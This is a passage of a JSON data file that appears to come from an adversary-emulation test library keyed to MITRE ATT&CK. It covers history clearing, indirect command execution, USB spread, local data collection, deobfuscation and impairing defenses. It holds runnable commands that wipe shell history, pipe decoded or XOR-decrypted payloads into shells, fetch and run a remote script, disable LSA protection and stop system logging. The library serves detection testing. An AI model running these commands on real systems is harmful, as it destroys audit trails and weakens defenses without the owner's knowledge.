truncate\n", "supported_platforms": ["linux"], "executor": {"command": "truncate -s0 ~/.bash_history\n", "name": "sh"}}, {"name": "Clear sh history (truncate)", "auto_generated_guid": "e14d9bb0-c853-4503-aa89-739d5c0a5818", "description": "Clears sh history via truncate\n", "supported_platforms": ["linux"], "executor": {"command": "truncate -s0 ~/.sh_history\n", "name": "sh"}}, {"name": "Clear history of a bunch of shells", "auto_generated_guid": "7e6721df-5f08-4370-9255-f06d8a77af4c", "description": "Clears the history of a bunch of different shell types by setting the history size to zero\n", "supported_platforms": ["linux", "macos"], "executor": {"command": "unset HISTFILE\nexport HISTFILESIZE=0\nhistory -c\n", "name": "sh"}}, {"name": "Clear history of a bunch of shells (freebsd)", "auto_generated_guid": "9bf7c8af-5e12-42ea-bf6b-b0348fb9dfb0", "description": "Clears the history of a bunch of different shell types by setting the history size to zero\n", "supported_platforms": ["linux"], "executor": {"command": "unset HISTFILE\nunset histfile\nexport HISTFILESIZE=0\nexport HISTSIZE=0\nhistory -c\n", "name": "sh"}}, {"name": "Clear and Disable Bash History Logging", "auto_generated_guid": "784e4011-bd1a-4ecd-a63a-8feb278512e6", "description": "Clears the history and disable bash history logging of the current shell and future shell sessions\n", "supported_platforms": ["linux", "macos"], "executor": {"command": "set +o history\necho 'set +o history' >> ~/.bashrc\n. ~/.bashrc\nhistory -c\n", "cleanup_command": "sed -i 's/set +o history//g' ~/.bashrc\n. ~/.bashrc\nset -o history\n", "name": "sh"}}, {"name": "Use Space Before Command to Avoid Logging to History", "auto_generated_guid": "53b03a54-4529-4992-852d-a00b4b7215a6", "description": "Using a space before a command causes the command to not be logged in the Bash History file\n", "supported_platforms": ["linux", "macos"], "executor": {"command": "hostname\nwhoami\n", "name": "sh"}}, {"name": "Disable Bash History Logging with SSH -T", "auto_generated_guid": "5f8abd62-f615-43c5-b6be-f780f25790a1", "description": "Keeps history clear and stays out of lastlog,wtmp,btmp ssh -T keeps the ssh client from catching a proper TTY, which is what usually gets logged on lastlog\n", "supported_platforms": ["linux"], "dependencies": [{"description": "Install sshpass and create user account used for excuting\n", "prereq_command": "$(getent passwd testuser1 >/dev/null) && $(which sshpass >/dev/null)\n", "get_prereq_command": "/usr/sbin/useradd testuser1\necho -e 'pwd101!\\npwd101!' | passwd testuser1\n(which yum && yum -y install epel-release sshpass)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y sshpass)\n"}], "executor": {"command": "sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname\n", "cleanup_command": "userdel -f testuser1\n", "name": "sh"}}, {"name": "Disable sh History Logging with SSH -T (freebsd)", "auto_generated_guid": "ec3f2306-dd19-4c4b-bed7-92d20e9b1dee", "description": "Keeps history clear and stays out of lastlog,wtmp,btmp ssh -T keeps the ssh client from catching a proper TTY, which is what usually gets logged on lastlog\n", "supported_platforms": ["linux"], "dependencies": [{"description": "Install sshpass and create user account used for excuting\n", "prereq_command": "$(getent passwd testuser1 >/dev/null) && $(which sshpass >/dev/null)\n", "get_prereq_command": "pw useradd testuser1 -g wheel -s /bin/sh\necho 'pwd101!' | pw mod user testuser1 -h 0\n(which pkg && pkg install -y sshpass)\n"}], "executor": {"command": "sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname\n", "cleanup_command": "rmuser -y testuser1\n", "name": "sh"}}, {"name": "Prevent Powershell History Logging", "auto_generated_guid": "2f898b81-3e97-4abb-bc3f-a95138988370", "description": "Prevents Powershell history\n", "supported_platforms": ["windows"], "executor": {"command": "Set-PSReadlineOption -HistorySaveStyle SaveNothing\n", "name": "powershell", "cleanup_command": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally"}}, {"name": "Clear Powershell History by Deleting History File", "auto_generated_guid": "da75ae8d-26d6-4483-b0fe-700e4df4f037", "description": "Clears Powershell history\n", "supported_platforms": ["windows"], "executor": {"command": "Remove-Item (Get-PSReadlineOption).HistorySavePath\n", "name": "powershell"}}, {"name": "Set Custom AddToHistoryHandler to Avoid History File Logging", "auto_generated_guid": "1d0d9aa6-6111-4f89-927b-53e8afae7f94", "description": "The \"AddToHistoryHandler\" receives the current command as the $line variable and then returns $true if \nthe line should be written to the history file. Here we simply return $false so nothing gets added to \nthe history file for the current session. \n", "supported_platforms": ["windows"], "executor": {"command": "Set-PSReadLineOption -AddToHistoryHandler { return $false }\n", "cleanup_command": "Set-PSReadLineOption -AddToHistoryHandler $null\n", "name": "powershell"}}]}, "T1202": {"name": "Indirect Command Execution", "technique_id": "attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e", "external_id": "T1202", "data_components": ["Command Execution", "Process Creation"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts. (Citation: VectorSec ForFiles Aug 2017) (Citation: Evi1cg Forfiles Nov 2017)\n\nAdversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.", "atomic_tests": [{"name": "Indirect Command Execution - pcalua.exe", "auto_generated_guid": "cecfea7a-5f03-4cdd-8bc8-6f7c22862440", "description": "The Program Compatibility Assistant (pcalua.exe) may invoke the execution of programs and commands from a Command-Line Interface.\n[Reference](https://twitter.com/KyleHanslovan/status/912659279806640128)\nUpon execution, calc.exe should open\n", "supported_platforms": ["windows"], "input_arguments": {"payload_path": {"description": "Path to payload", "type": "path", "default": "C:\\Windows\\System32\\calc.exe"}, "process": {"description": "Process to execute", "type": "string", "default": "calc.exe"}}, "executor": {"command": "pcalua.exe -a #{process}\npcalua.exe -a #{payload_path}\n", "name": "command_prompt"}}, {"name": "Indirect Command Execution - forfiles.exe", "auto_generated_guid": "8b34a448-40d9-4fc3-a8c8-4bb286faf7dc", "description": "forfiles.exe may invoke the execution of programs and commands from a Command-Line Interface.\n[Reference](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Forfiles.yml)\n\"This is basically saying for each occurrence of notepad.exe in c:\\windows\\system32 run calc.exe\"\nUpon execution calc.exe will be opened.\n", "supported_platforms": ["windows"], "input_arguments": {"process": {"description": "Process to execute", "type": "string", "default": "calc.exe"}}, "executor": {"command": "forfiles /p c:\\windows\\system32 /m notepad.exe /c #{process}\n", "name": "command_prompt"}}, {"name": "Indirect Command Execution - conhost.exe", "auto_generated_guid": "cf3391e0-b482-4b02-87fc-ca8362269b29", "description": "conhost.exe refers to a host process for the console window. It provide an interface between command prompt and Windows explorer.\nExecuting it through command line can create process ancestry anomalies\n[Reference] (http://www.hexacorn.com/blog/2020/05/25/how-to-con-your-host/)\n", "supported_platforms": ["windows"], "input_arguments": {"process": {"description": "Process to execute", "type": "string", "default": "notepad.exe"}}, "executor": {"command": "conhost.exe \"#{process}\"\n", "name": "command_prompt"}}]}, "T1091": {"name": "Replication Through Removable Media", "technique_id": "attack-pattern--3b744087-9945-4a6f-91e8-9dbceda417a4", "external_id": "T1091", "data_components": ["File Access", "File Creation", "Process Creation", "Drive Creation"], "kill_chain_phases": ["lateral-movement", "initial-access"], "data_source_platforms": [], "mitigations": ["course-of-action--2995bc22-2851-4345-ad19-4e7e295be264", "course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.\n\nMobile devices may also be used to infect PCs with malware if connected via USB.(Citation: Exploiting Smartphone USB ) This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables.(Citation: Windows Malware Infecting Android)(Citation: iPhone Charging Cable Hack) For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).", "atomic_tests": [{"name": "USB Malware Spread Simulation", "auto_generated_guid": "d44b7297-622c-4be8-ad88-ec40d7563c75", "description": "Simulates an adversary copying malware to all connected removable drives. \n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "command": "$RemovableDrives=@()\n$RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter \"drivetype=2\" | select-object -expandproperty DeviceID\nForEach ($Drive in $RemovableDrives)\n{\nwrite-host \"Removable Drive Found:\" $Drive\nNew-Item -Path $Drive/T1091Test1.txt -ItemType \"file\" -Force -Value \"T1091 Test 1 has created this file to simulate malware spread to removable drives.\"\n}\n", "cleanup_command": "$RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter \"drivetype=2\" | select-object -expandproperty DeviceID\nForEach ($Drive in $RemovableDrives)\n{\nRemove-Item -Path $Drive\\T1091Test1.txt -Force -ErrorAction Ignore\n}\n"}}]}, "T1005": {"name": "Data from Local System", "technique_id": "attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5", "external_id": "T1005", "data_components": ["Process Creation", "Command Execution", "File Access", "Script Execution", "OS API Execution"], "kill_chain_phases": ["collection"], "data_source_platforms": [], "mitigations": ["course-of-action--65401701-019d-44ff-b223-08d520bb0e7b"], "description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n", "atomic_tests": [{"name": "Search files of interest and save them to a single zip file (Windows)", "auto_generated_guid": "d3d9af44-b8ad-4375-8b0a-4bff4b7e419c", "description": "This test searches for files of certain extensions and saves them to a single zip file prior to extraction.                              \n", "supported_platforms": ["windows"], "input_arguments": {"starting_directory": {"description": "Path to starting directory for the search", "type": "Path", "default": "C:\\Users"}, "output_zip_folder_path": {"description": "Path to directory for saving the generated zip file", "type": "Path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1005"}, "file_extensions": {"description": "List of file extensions to be searched and zipped, separated by comma and space", "type": "string", "default": ".doc, .docx, .txt"}}, "executor": {"command": "$startingDirectory = \"#{starting_directory}\"\n$outputZip = \"#{output_zip_folder_path}\"\n$fileExtensionsString = \"#{file_extensions}\" \n$fileExtensions = $fileExtensionsString -split \", \"\n\nNew-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null\n\nFunction Search-Files {\n  param (\n    [string]$directory\n  )\n  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {\n    $fileExtensions -contains $_.Extension.ToLower()\n  }\n  return $files\n}\n\n$foundFiles = Search-Files -directory $startingDirectory\nif ($foundFiles.Count -gt 0) {\n  $foundFilePaths = $foundFiles.FullName\n  Compress-Archive -Path $foundFilePaths -DestinationPath \"$outputZip\\data.zip\"\n\n  Write-Host \"Zip file created: $outputZip\\data.zip\"\n  } else {\n      Write-Host \"No files found with the specified extensions.\"\n  }\n", "cleanup_command": "Remove-Item -Path  $outputZip\\data.zip -Force\n", "name": "powershell", "elevation_required": false}}, {"name": "Find and dump sqlite databases (Linux)", "auto_generated_guid": "00cbb875-7ae4-4cf1-b638-e543fd825300", "description": "An adversary may know/assume that the user of a system uses sqlite databases which contain interest and sensitive data. In this test we download two databases and a sqlite dump script, then run a find command to find & dump the database content.\n", "supported_platforms": ["linux"], "input_arguments": {"remote_url": {"description": "url of remote payload", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src"}}, "dependencies": [{"description": "Check if running on a Debian based machine.\n", "prereq_command": "if [ -x \"$(command -v sqlite3)\" ]; then echo \"sqlite3 is installed\"; else echo \"sqlite3 is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v strings)\" ]; then echo \"strings is installed\"; else echo \"strings is NOT installed\"; exit 1; fi\n", "get_prereq_command": "if grep -iq \"debian\\|ubuntu\\|kali\\|mint\" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi\nif grep -iq \"rhel\\|fedora\\|centos\" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi\n"}], "executor": {"name": "bash", "elevation_required": false, "command": "cd $HOME\ncurl -O #{remote_url}/art\ncurl -O #{remote_url}/gta.db\ncurl -O #{remote_url}/sqlite_dump.sh\nchmod +x sqlite_dump.sh\nfind . ! -executable -exec bash -c 'if [[ \"$(head -c 15 {} | strings)\" == \"SQLite format 3\" ]]; then echo \"{}\"; ./sqlite_dump.sh {}; fi' \\;\n", "cleanup_command": "rm -f $HOME/.art\nrm -f $HOME/gta.db\nrm -f $HOME/sqlite_dump.sh \n"}}]}, "T1140": {"name": "Deobfuscate/Decode Files or Information", "technique_id": "attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c", "external_id": "T1140", "data_components": ["Script Execution", "Process Creation", "File Modification"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file.(Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.(Citation: Carbon Black Obfuscation Sept 2016)\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016)", "atomic_tests": [{"name": "Deobfuscate/Decode Files Or Information", "auto_generated_guid": "dc6fe391-69e6-4506-bd06-ea5eeb4082f8", "description": "Encode/Decode executable\nUpon execution a file named T1140_calc_decoded.exe will be placed in the temp folder\n", "supported_platforms": ["windows"], "input_arguments": {"executable": {"description": "name of executable", "type": "path", "default": "C:\\Windows\\System32\\calc.exe"}}, "executor": {"command": "certutil -encode #{executable} %temp%\\T1140_calc.txt\ncertutil -decode %temp%\\T1140_calc.txt %temp%\\T1140_calc_decoded.exe\n", "cleanup_command": "del %temp%\\T1140_calc.txt >nul 2>&1\ndel %temp%\\T1140_calc_decoded.exe >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Certutil Rename and Decode", "auto_generated_guid": "71abc534-3c05-4d0c-80f7-cbe93cb2aa94", "description": "Rename certutil and decode a file. This is in reference to latest research by FireEye [here](https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html)\n", "supported_platforms": ["windows"], "input_arguments": {"executable": {"description": "name of executable/file to decode", "type": "path", "default": "C:\\Windows\\System32\\calc.exe"}}, "executor": {"command": "copy %windir%\\system32\\certutil.exe %temp%\\tcm.tmp\n%temp%\\tcm.tmp -encode #{executable} %temp%\\T1140_calc2.txt\n%temp%\\tcm.tmp -decode %temp%\\T1140_calc2.txt %temp%\\T1140_calc2_decoded.exe\n", "cleanup_command": "del %temp%\\tcm.tmp >nul 2>&1\ndel %temp%\\T1140_calc2.txt >nul 2>&1\ndel %temp%\\T1140_calc2_decoded.exe >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Base64 decoding with Python", "auto_generated_guid": "356dc0e8-684f-4428-bb94-9313998ad608", "description": "Use Python to decode a base64-encoded text string and echo it to the console\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"message": {"description": "Message to print to the screen", "type": "string", "default": "Hello from Atomic Red Team test T1140!"}, "encoded_file": {"description": "File to temporarily save encoded text", "type": "path", "default": "/tmp/T1140.encoded"}}, "dependencies": [{"description": "Python must be present\n", "prereq_command": "which python3\n", "get_prereq_command": "echo \"Please install Python 3\"\n"}], "executor": {"name": "sh", "elevation_required": false, "command": "ENCODED=$(python3 -c 'import base64;enc=base64.b64encode(\"#{message}\".encode());print(enc.decode())')\npython3 -c \"import base64;dec=base64.b64decode(\\\"$ENCODED\\\");print(dec.decode())\"\npython3 -c \"import base64 as d;dec=d.b64decode(\\\"$ENCODED\\\");print(dec.decode())\"\npython3 -c \"from base64 import b64decode;dec=b64decode(\\\"$ENCODED\\\");print(dec.decode())\"\npython3 -c \"from base64 import b64decode as d;dec=d(\\\"$ENCODED\\\");print(dec.decode())\"\necho $ENCODED | python3 -c \"import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())\"\necho $ENCODED > #{encoded_file} && python3 -c \"import base64;dec=base64.b64decode(open('#{encoded_file}').read());print(dec.decode())\"\n"}}, {"name": "Base64 decoding with Perl", "auto_generated_guid": "6604d964-b9f6-4d4b-8ce8-499829a14d0a", "description": "Use Perl to decode a base64-encoded text string and echo it to the console    \n", "supported_platforms": ["linux", "macos"], "input_arguments": {"message": {"description": "Message to print to the screen", "type": "string", "default": "Hello from Atomic Red Team test T1140!"}, "encoded_file": {"description": "File to temporarily save encoded text", "type": "path", "default": "/tmp/T1140.encoded"}}, "dependencies": [{"description": "Perl must be present\n", "prereq_command": "which perl\n", "get_prereq_command": "echo \"Please install Perl\"\n"}], "executor": {"name": "sh", "elevation_required": false, "command": "ENCODED=$(perl -e \"use MIME::Base64;print(encode_base64('#{message}'));\")\nperl -le \"use MIME::Base64;print(decode_base64('$ENCODED'));\"\necho $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));'\necho $ENCODED > #{encoded_file} && perl -le 'use MIME::Base64;open($f,\"<\",\"#{encoded_file}\");print(decode_base64(<$f>));'\n"}}, {"name": "Base64 decoding with shell utilities", "auto_generated_guid": "b4f6a567-a27a-41e5-b8ef-ac4b4008bb7e", "description": "Use common shell utilities to decode a base64-encoded text string and echo it to the console\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"message": {"description": "Message to print to the screen", "type": "string", "default": "Hello from Atomic Red Team test T1140!"}, "encoded_file": {"description": "File to temporarily save encoded text", "type": "path", "default": "/tmp/T1140.encoded"}}, "executor": {"name": "sh", "elevation_required": false, "command": "ENCODED=$(echo '#{message}' | base64)\nprintf $ENCODED | base64 -d\necho $ENCODED | base64 -d\necho $(echo $ENCODED) | base64 -d\necho $ENCODED > #{encoded_file} && base64 -d #{encoded_file}\necho $ENCODED > #{encoded_file} && base64 -d < #{encoded_file}\necho $ENCODED > #{encoded_file} && cat #{encoded_file} | base64 -d\necho $ENCODED > #{encoded_file} && cat < #{encoded_file} | base64 -d\nbash -c \"{echo,\\\"$(echo $ENCODED)\\\"}|{base64,-d}\"\n"}}, {"name": "Base64 decoding with shell utilities (freebsd)", "auto_generated_guid": "b6097712-c42e-4174-b8f2-4b1e1a5bbb3d", "description": "Use common shell utilities to decode a base64-encoded text string and echo it to the console\n", "supported_platforms": ["linux"], "input_arguments": {"message": {"description": "Message to print to the screen", "type": "string", "default": "Hello from Atomic Red Team test T1140!"}, "encoded_file": {"description": "File to temporarily save encoded text", "type": "path", "default": "/tmp/T1140.encoded"}}, "executor": {"name": "sh", "elevation_required": false, "command": "ENCODED=$(echo '#{message}' | b64encode -r -)\nprintf $ENCODED | b64decode -r\necho $ENCODED | b64decode -r\necho $(echo $ENCODED) | b64decode -r\necho $ENCODED > #{encoded_file} && b64encode -r #{encoded_file}\necho $ENCODED > #{encoded_file} && b64decode -r < #{encoded_file}\necho $ENCODED > #{encoded_file} && cat #{encoded_file} | b64decode -r\necho $ENCODED > #{encoded_file} && cat < #{encoded_file} | b64decode -r\n"}}, {"name": "FreeBSD b64encode Shebang in CLI", "auto_generated_guid": "18ee2002-66e8-4518-87c5-c0ec9c8299ac", "description": "Using b64decode shell scripts that have Shebang in them. This is commonly how attackers obfuscate passing and executing a shell script. Seen [here](https://www.trendmicro.com/pl_pl/research/20/i/the-evolution-of-malicious-shell-scripts.html) by TrendMicro, as well as [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS). Also a there is a great Sigma rule [here](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_base64_shebang_cli.yml) for it. \n", "supported_platforms": ["linux"], "input_arguments": {"bash_encoded": {"description": "Encoded", "type": "string", "default": "IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo="}, "dash_encoded": {"description": "Encoded", "type": "string", "default": "IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo="}, "fish_encoded": {"description": "Encoded", "type": "string", "default": "IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo="}, "sh_encoded": {"description": "Encoded", "type": "string", "default": "IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK"}}, "dependencies": [{"description": "b64decode must be present\n", "prereq_command": "which b64decode\n", "get_prereq_command": "echo \"please install b64decode\"\n"}], "executor": {"name": "sh", "elevation_required": false, "command": "echo #{bash_encoded} | b64decode -r | sh\necho #{dash_encoded} | b64decode -r | sh\necho #{fish_encoded} | b64decode -r | sh\necho #{sh_encoded} | b64decode -r | sh\n"}}, {"name": "Hex decoding with shell utilities", "auto_generated_guid": "005943f9-8dd5-4349-8b46-0313c0a9f973", "description": "Use common shell utilities to decode a hex-encoded text string and echo it to the console\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"message": {"description": "Message to print to the screen", "type": "string", "default": "Hello from Atomic Red Team test T1140!"}, "encoded_file": {"description": "File to temporarily save encoded text", "type": "path", "default": "/tmp/T1140.encoded"}}, "dependencies": [{"description": "xxd must be present\n", "prereq_command": "which xxd\n", "get_prereq_command": "echo \"Please install xxd\"\n"}], "executor": {"name": "sh", "elevation_required": false, "command": "ENCODED=$(echo '#{message}' | xxd -ps -c 256)\nprintf $ENCODED | xxd -r -p\necho $ENCODED | xxd -r -p\necho $(echo $ENCODED) | xxd -r -p\necho $ENCODED > #{encoded_file} && xxd -r -p #{encoded_file}\necho $ENCODED > #{encoded_file} && xxd -r -p < #{encoded_file}\necho $ENCODED > #{encoded_file} && cat #{encoded_file} | xxd -r -p\necho $ENCODED > #{encoded_file} && cat < #{encoded_file} | xxd -r -p\n"}}, {"name": "Linux Base64 Encoded Shebang in CLI", "auto_generated_guid": "3a15c372-67c1-4430-ac8e-ec06d641ce4d", "description": "Using Linux Base64 Encoded shell scripts that have Shebang in them. This is commonly how attackers obfuscate passing and executing a shell script. Seen [here](https://www.trendmicro.com/pl_pl/research/20/i/the-evolution-of-malicious-shell-scripts.html) by TrendMicro, as well as [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS). Also a there is a great Sigma rule [here](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_base64_shebang_cli.yml) for it. \n", "supported_platforms": ["linux", "macos"], "input_arguments": {"bash_encoded": {"description": "Encoded", "type": "string", "default": "IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo="}, "dash_encoded": {"description": "Encoded", "type": "string", "default": "IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo="}, "fish_encoded": {"description": "Encoded", "type": "string", "default": "IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo="}, "sh_encoded": {"description": "Encoded", "type": "string", "default": "IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK"}}, "dependencies": [{"description": "base64 must be present\n", "prereq_command": "which base64\n", "get_prereq_command": "echo \"please install base64\"\n"}], "executor": {"name": "sh", "elevation_required": false, "command": "echo #{bash_encoded} | base64 -d | bash\necho #{dash_encoded} | base64 -d | bash\necho #{fish_encoded} | base64 -d | bash\necho #{sh_encoded} | base64 -d | bash\n"}}, {"name": "XOR decoding and command execution using Python", "auto_generated_guid": "c3b65cd5-ee51-4e98-b6a3-6cbdec138efc", "description": "An adversary can obfuscate malicious commands or payloads using XOR and execute them on the victim's machine. This test uses Python to decode and execute commands on the machine.", "supported_platforms": ["linux", "macos"], "input_arguments": {"xor_key": {"description": "Key used to decrypt the command ", "type": "string", "default": "waEHleblxiQjoxFJQaIMLdHKz"}, "encrypted_command": {"description": "Encrypted command that will be executed", "type": "string", "default": "AAkqKQEM"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "Python3 must be installed", "prereq_command": "which python3", "get_prereq_command": "echo \"Install Python3\""}], "executor": {"command": "python3 -c 'import base64; import subprocess; xor_decrypt = lambda text, key: \"\".join([chr(c ^ ord(k)) for c, k in zip(base64.b64decode(text.encode()), key)]); command = \"#{encrypted_command}\"; key = \"#{xor_key}\"; exec = xor_decrypt(command, key); subprocess.call(exec, shell=True)'", "cleanup_command": null, "name": "bash", "elevation_required": false}}]}, "T1562": {"name": "Impair Defenses", "technique_id": "attack-pattern--3d333250-30e4-4a82-9edc-756c68afc529", "external_id": "T1562", "data_components": ["Driver Load", "Script Execution", "User Account Modification", "Firewall Disable", "Cloud Service Modification", "Cloud Service Disable", "Command Execution", "Firewall Rule Modification", "Service Metadata", "Process Creation", "Windows Registry Key Deletion", "Process Termination", "Windows Registry Key Modification", "Host Status"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--987988f0-cf86-4680-a875-2f6456ab2448", "course-of-action--a2c36a5d-4058-475e-8e77-fff75e50d3b9", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8"], "description": "Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.\n\nAdversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out of a computer or stopping it from being shut down. These restrictions can further enable malicious operations as well as the continued propagation of incidents.(Citation: Emotet shutdown)\n\nAdversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components.", "atomic_tests": [{"name": "Windows Disable LSA Protection", "auto_generated_guid": "40075d5f-3a70-4c66-9125-f72bee87247d", "description": "The following Atomic adds a registry entry to disable LSA Protection.\n\nThe LSA controls and manages user rights information, password hashes and other important bits of information in memory. Attacker tools, such as mimikatz, rely on accessing this content to scrape password hashes or clear-text passwords. Enabling LSA Protection configures Windows to control the information stored in memory in a more secure fashion - specifically, to prevent non-protected processes from accessing that data.\nUpon successful execution, the registry will be modified and RunAsPPL will be set to 0, disabling Lsass protection.\nhttps://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection#how-to-disable-lsa-protection\nhttps://blog.netwrix.com/2022/01/11/understanding-lsa-protection/\nhttps://thedfirreport.com/2022/03/21/phosphorus-automates-initial-access-using-proxyshell/  \n", "supported_platforms": ["windows"], "executor": {"command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /t REG_DWORD /d 0 /f\n", "cleanup_command": "reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Disable journal logging via systemctl utility", "auto_generated_guid": "c3a377f9-1203-4454-aa35-9d391d34768f", "description": "The atomic test disables the journal logging using built-in systemctl utility\n", "supported_platforms": ["linux"], "executor": {"command": "sudo systemctl stop systemd-journald #disables journal logging\n", "cleanup_command": "sudo systemctl start systemd-journald #starts journal service\nsudo systemctl enable systemd-journald #starts journal service automatically at boot time\n", "name": "sh", "elevation_required": true}}, {"name": "Disable journal logging via sed utility", "auto_generated_guid": "12e5551c-8d5c-408e-b3e4-63f53b03379f", "description": "The atomic test disables the journal logging by searching and replacing the \"Storage\" parameter to \"none\" within the journald.conf file, thus any new journal entries will only be temporarily available in memory and not written to disk\n", "supported_platforms": ["linux"], "executor": {"command": "sudo sed -i 's/Storage=auto/Storage=none/' /etc/systemd/journald.conf\n", "cleanup_command": "sudo sed -i 's/Storage=none/Storage=auto/' /etc/systemd/journald.conf #re-enables storage of journal data\nsudo systemctl restart systemd-journald #restart the journal service\n", 